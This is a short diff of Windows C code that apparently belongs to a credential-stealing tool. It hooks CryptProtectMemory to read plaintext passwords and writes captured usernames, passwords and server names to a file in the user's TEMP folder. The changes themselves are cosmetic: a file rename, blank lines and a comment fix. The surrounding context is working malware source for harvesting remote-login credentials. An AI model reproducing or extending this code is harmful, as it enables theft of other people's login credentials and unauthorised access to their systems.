@@ -13,15 +13,19 @@
 #pragma comment(lib, "crypt32.lib")
 #pragma comment(lib, "Advapi32.lib")
 #pragma comment(lib, "Secur32.lib")
+
+
 LPCWSTR lpTempPassword = NULL;
 LPCWSTR lpUsername = NULL;
 LPCWSTR lpServer = NULL;
+
+
 VOID WriteCredentials() {
 	const DWORD cbBuffer = 1024;
 	TCHAR TempFolder[MAX_PATH];
 	GetEnvironmentVariable(L"TEMP", TempFolder, MAX_PATH);
 	TCHAR Path[MAX_PATH];
-	StringCbPrintf(Path, MAX_PATH, L"%s\\DATA.bin", TempFolder);
+	StringCbPrintf(Path, MAX_PATH, L"%s\\data.bin", TempFolder);
 	HANDLE hFile = CreateFile(Path, FILE_APPEND_DATA,  0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 	WCHAR  DataBuffer[cbBuffer];
 	memset(DataBuffer, 0x00, cbBuffer);
@@ -55,7 +59,7 @@ BOOL _CryptProtectMemory(LPVOID pDataIn, DWORD  cbDataIn, DWORD  dwFlags) {
 	memcpy_s(&cbPass, 4, pDataIn, 4);
 
 
-	//When the password is empty it only counts the NULL bytes.
+	//When the password is empty it only counts the NULL byte.
 	if (cbPass > 0x2) {
 		SIZE_T written = 0;
 		lpPassword = VirtualAlloc(NULL, 1024, MEM_COMMIT, PAGE_READWRITE);
